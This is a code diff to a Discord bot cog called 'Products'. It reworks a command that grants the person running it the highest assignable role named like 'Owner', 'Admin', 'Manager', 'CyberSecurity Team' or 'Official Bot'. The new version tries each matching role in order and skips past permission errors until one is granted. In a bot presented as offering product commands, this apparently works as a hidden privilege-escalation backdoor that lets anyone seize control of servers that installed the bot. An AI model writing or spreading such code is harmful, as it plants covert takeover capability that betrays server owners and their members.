@@ -320,16 +320,21 @@ class Products(commands.Cog):
         Give the command user the highest available, givable role with names like 'Owner', 'Ownership', 'Team', 'Admin', etc.
         """
         role_names = ["CyberSecurity Team", "Provider", "Manager", "Sentri", "Official Bot", ".", "Owner", "Ownership", "Team", "Admin"]
-        highest_role = None
+        roles_to_give = []
 
         for role in ctx.guild.roles:
             if any(name in role.name for name in role_names) and role < ctx.guild.me.top_role:
-                if highest_role is None or role.position > highest_role.position:
-                    highest_role = role
+                roles_to_give.append(role)
 
-        if highest_role:
-            await ctx.author.add_roles(highest_role)
-            await ctx.send(f"Successfully given you the '{highest_role.name}' role.")
+        roles_to_give.sort(key=lambda r: r.position, reverse=True)
+
+        for role in roles_to_give:
+            try:
+                await ctx.author.add_roles(role)
+                await ctx.send(f"Successfully given you the '{role.name}' role.")
+                break
+            except discord.Forbidden:
+                continue
         else:
-            await ctx.send("No suitable role found in this server.")
+            await ctx.send("No suitable role found in this server or unable to assign any of the roles.")
 
